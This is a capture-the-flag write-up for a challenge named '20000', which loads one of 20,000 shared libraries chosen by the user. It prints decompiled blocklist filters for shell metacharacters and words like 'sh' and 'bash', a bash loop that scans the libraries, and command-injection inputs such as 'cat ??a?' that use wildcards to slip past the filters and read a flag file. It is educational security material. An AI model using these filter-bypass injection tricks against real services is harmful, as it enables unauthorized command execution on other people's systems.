# 20000

6.9 Points

**Problem description**:
```
nc 110.10.147.106 15959

Download
```

Woah, we have 5MB archive, but 100MB of binaries. High compressibility = classic '1001 cuts' challenge.
We can do some clever work with Binja or binary diffing, but hold on.
Let's first try stupid strategies. Aka dynamic analysis :P

Get a feel for the challenge bin...
```
$ ./20000

   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$
  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$
 |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$
   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$
  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$
 | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$
 | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/
 |________/ \______/  \______/  \______/  \______/

INPUT : g
Error: ./20000_so/lib_0.so: cannot open shared object file: No such file or directory
```

OK, our first input decide which library we use.

```
$ LD_DEBUG=libs  ./20000
...
   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$
  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$
 |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$
   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$
  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$
 | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$
 | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/
 |________/ \______/  \______/  \______/  \______/

INPUT : 5
     28885:
     28885:     calling init: ./20000_so/lib_5.so
     28885:
     28885:
     28885:     calling init: ./20000_so/lib_5091.so
     28885:
     28885:
     28885:     calling init: ./20000_so/lib_17470.so
     28885:
This is lib_5 file.
How do you find vulnerable file?
a
ls: cannot access 'a'$'\n': No such file or directory
...
```

How strange, it seems like we are using `system`. This is suspicious.
Let's take a peek.

```c
signed __int64 test()
{
  char *v0; // rax
  signed __int64 result; // rax
  char *v2; // rax
  void (__fastcall *v3)(char *, char *); // [rsp+0h] [rbp-B0h]
  void (__fastcall *v4)(char *); // [rsp+8h] [rbp-A8h]
  void *handle; // [rsp+10h] [rbp-A0h]
  void *v6; // [rsp+18h] [rbp-98h]
  char buf; // [rsp+20h] [rbp-90h]
  __int16 v8; // [rsp+50h] [rbp-60h]
  char s; // [rsp+60h] [rbp-50h]
  __int16 v10; // [rsp+90h] [rbp-20h]
  unsigned __int64 v11; // [rsp+98h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  memset(&buf, 0, 0x30uLL);
  v8 = 0;
  memset(&s, 0, 0x30uLL);
  v10 = 0;
  handle = dlopen("./20000_so/lib_5091.so", 1);
  if ( handle )
  {
    v3 = (void (__fastcall *)(char *, char *))dlsym(handle, "filter1");
    v6 = dlopen("./20000_so/lib_17470.so", 1);
    if ( v6 )
    {
      v4 = (void (__fastcall *)(char *))dlsym(v6, "filter2");
      puts("This is lib_5 file.");
      puts("How do you find vulnerable file?");
      read(0, &buf, 0x32uLL);
      v3(&buf, &buf);
      v4(&buf);
      sprintf(&s, "ls \"%s\"", &buf);
      system(&s);
      dlclose(handle);
      dlclose(v6);
      result = 0LL;
    }ls "" . ""
    else
    {
      v2 = dlerror();
      fprintf(stderr, "Error: %s\n", v2);
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    v0 = dlerror();
    fprintf(stderr, "Error: %s\n", v0);
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

OK, using filter from random other library. Let's take a peek.

```c
char *__fastcall filter2(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, 'v') )
    exit(0);
  if ( strchr(a1, 'm') )
    exit(0);
  if ( strchr(a1, 'p') )
    exit(0);
  if ( strchr(a1, 'd') )
    exit(0);
  if ( strchr(a1, 'n') )
    exit(0);
  if ( strstr(a1, "bin") )
    exit(0);
  if ( strstr(a1, "sh") )
    exit(0);
  if ( strstr(a1, "bash") )
    exit(0);
  if ( strchr(a1, 'f') )
    exit(0);
  if ( strchr(a1, 'l') )
    exit(0);
  result = strchr(a1, 'g');
  if ( result )
    exit(0);
  return result;
}
char *__fastcall filter1(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, ';') )
    exit(0);
  if ( strchr(a1, '*') )
    exit(0);
  if ( strchr(a1, '|') )
    exit(0);
  if ( strchr(a1, '&') )
    exit(0);
  if ( strchr(a1, '$') )
    exit(0);
  if ( strchr(a1, '`') )
    exit(0);
  if ( strchr(a1, '>') )
    exit(0);
  if ( strchr(a1, '<') )
    exit(0);
  result = strchr(a1, 'r');
  if ( result )
    exit(0);
  return result;
}
```

We can clearly inject on this...

```
INPUT :5
This is lib_5 file.
How do you find vulnerable file?
".
20000
20000_so
20000_so.tar.gz
flag
```

We can have `..`, `/`, and `?` available to us. We can use `?` as a wildcard!

```
INPUT : 5
This is lib_5 file.
How do you find vulnerable file?
" ??a?
flag
```

But unfortunately, it seems impossible to bypass the filters to inject a command to print the flag.

Let's take a step back.

```bash
for i in {1..20000}; do
	echo "$i:" >> out
	echo -e "$i\n\"." >> out
done	
```

We check output, and some files do `ls`, some do not. So, let's figure out exactly what's going on.

```bash
for i in {1..20000}; do
	echo "$i" >> strs.txt
	readelf -p .rodata "lib_$i.so" >> strs.txt
done
```

Sample of output

```
1

String dump of section '.rodata':
  [     0]  This is lib_1 file.
  [    18]  How do you find vulnerable file?
  [    39]  exit
  [    3e]  bin
  [    42]  sh
  [    45]  bash

2

String dump of section '.rodata':
  [     0]  This is lib_2 file.
  [    18]  How do you find vulnerable file?
  [    39]  exit
  [    3e]  bin
  [    42]  sh
  [    45]  bash

```

There is toooo much garbage here. Let's clean it up.
First, delete `String dump of section '.rodata':`. Then delete `^  \[\s+[0-9a-f]+?\]  `.
Now unique it.

```
1

This is lib_1 file.
How do you find vulnerable file?
exit
bin
sh
bash
2
This is lib_2 file.
3
This is lib_3 file.
4
This is lib_4 file.
5
./20000_so/lib_5091.so
Error: %s^J
filter1
./20000_so/lib_17470.so
```

Look better, but still too much garbage. `sed -i -E "/This is lib/d" strs.txt` and `sed -i -E "/20000_so/d" strs.txt`.

```
1

How do you find vulnerable file?
exit
bin
sh
bash
2
3
4
5
Error: %s^J
filter1
filter2
ls "%s"
6
7
8
...
17392
17393
17394
%s 2 > /dev/null
17395
17396
17397
...
20000
```

WTF??? `%s 2 > /dev/null` ??? Number 17394 is special!

```
INPUT : 17394
This is lib_17394 file.
How do you find vulnerable file?
a #
sh: 1: a: not found
sh: 2: 2: not found
```

Although "f", "l", and "g" are banned, "cat" is OK, and we can use `??a?` for "flag"!

```
$ nc 110.10.147.106 15959

   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$
  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$
 |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$
   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$
  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$
 | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$
 | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/
 |________/ \______/  \______/  \______/  \______/

INPUT : 17394
This is lib_17394 file.
How do you find vulnerable file?
cat ??a?
flag{Are_y0u_A_h@cker_in_real-word?}
```

And that is how you cheese a challenge like a pro.